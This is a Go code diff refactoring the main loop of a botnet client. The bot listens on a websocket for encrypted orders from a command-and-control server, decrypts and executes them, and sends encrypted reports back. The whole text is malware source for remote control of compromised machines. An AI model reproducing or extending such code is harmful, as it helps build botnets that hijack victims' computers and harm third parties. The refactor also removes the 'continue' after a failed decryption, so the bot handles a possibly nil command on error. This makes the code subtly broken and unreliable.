@@ -2,7 +2,6 @@ package bot
 
 import (
 	"crypto/rsa"
-	"encoding/json"
 	"fmt"
 	"log"
 	"os"
@@ -47,7 +46,7 @@ func (b *Bot) Run() {
 	signal.Notify(interrupt, os.Interrupt)
 	for {
 		log.Println("[bot] waiting for command and control...")
-		msgType, encryptedMessage, err := b.ccConnection.ReadMessage()
+		msgType, encryptedCmd, err := b.ccConnection.ReadMessage()
 		if err != nil {
 			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
 				log.Printf("WS connection was closed unexpectedly: %s", err)
@@ -58,17 +57,11 @@ func (b *Bot) Run() {
 		if msgType != websocket.BinaryMessage {
 			continue
 		}
-		jsonMsg, err := encryption.DecryptMessage(encryptedMessage, b.cmdDecryptKey)
+		cmd, err := protocol.DecryptCommand(encryptedCmd, b.cmdDecryptKey)
 		if err != nil {
-			log.Printf("could not decrypt message from c&c server: %s", err)
-			continue
+			log.Printf("error decrypting command from cmd&ctrl: %s", err)
 		}
-		var cmd protocol.Command
-		if err = json.Unmarshal(jsonMsg, &cmd); err != nil {
-			log.Printf("could not unmarshal message from c&c server: %s", err)
-			continue
-		}
-		b.HandleCommandFromCC(&cmd)
+		b.HandleCommandFromCC(cmd)
 	}
 }
 
@@ -89,11 +82,7 @@ func (b *Bot) HandleCommandFromCC(c *protocol.Command) error {
 
 // SendMessageToCC encrypts and sends a message to the CC Server
 func (b *Bot) SendMessageToCC(msg *protocol.Message) error {
-	msgJSON, err := json.Marshal(msg)
-	if err != nil {
-		return fmt.Errorf("could not marshal message: %s", err)
-	}
-	msgEncr, err := encryption.EncryptMessage(msgJSON, b.msgEncryptKey)
+	msgEncr, err := msg.Encrypt(b.msgEncryptKey)
 	if err != nil {
 		return fmt.Errorf("could not encrypt message: %s", err)
 	}
